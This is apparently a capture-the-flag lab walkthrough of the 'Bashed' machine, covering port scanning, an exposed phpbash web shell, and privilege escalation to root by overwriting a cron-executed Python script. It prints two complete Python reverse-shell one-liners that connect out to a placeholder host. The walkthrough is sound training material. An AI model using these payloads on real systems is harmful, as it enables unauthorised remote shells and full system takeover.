## Initial Enumeration

A full port scan was run to identify the exposed services.

```bash
nmap -Pn -sV -sC -p- --open 10.10.10.68 -oN scan.txt
```

Only an **HTTP** service is running, and the site shows nothing obviously interesting at first glance.

## Directory Enumeration

Directory enumeration with **dirb** is used to find hidden content.

```bash
dirb http://10.10.10.68/
```

It surfaces two interesting directories, `/dev` and `/uploads`. The `/dev` directory holds two files, one of which, `phpbash.php`, exposes a web-based command execution interface.

## Initial Access

Since that interface allows command execution, it is used to obtain a PHP reverse shell. A listener is started on the attacking machine first.

![Netcat listener](/assets/images/bashed/26-1.png)
*Listener ready on the attacking machine*

Then the following Python payload is executed:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This returns a shell on the target.

## User Enumeration

Local enumeration shows that the user **scriptmanager** can run commands with `sudo`.

![sudo permissions](/assets/images/bashed/26-2.png)
*sudo rights available to scriptmanager*

Switching to **scriptmanager** continues the enumeration.

![User switch](/assets/images/bashed/26-3.png)
*Now operating as scriptmanager*

To look for escalation vectors, **linpeas.sh** is uploaded and run on the target.

## Privilege Escalation

LinPEAS points to a `/scripts` directory. Inside it, a Python script `test.py` writes its output to `test.txt`. The output file is owned by **root**, while `test.py` is writable by the current user, which strongly suggests a scheduled task (a **cron job**) is running the scripts in `/scripts` periodically as root.

That is exploited by writing a malicious Python script that opens a root reverse shell.

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
```

With a listener running, the cron job executes the script and returns a reverse shell as **root**.
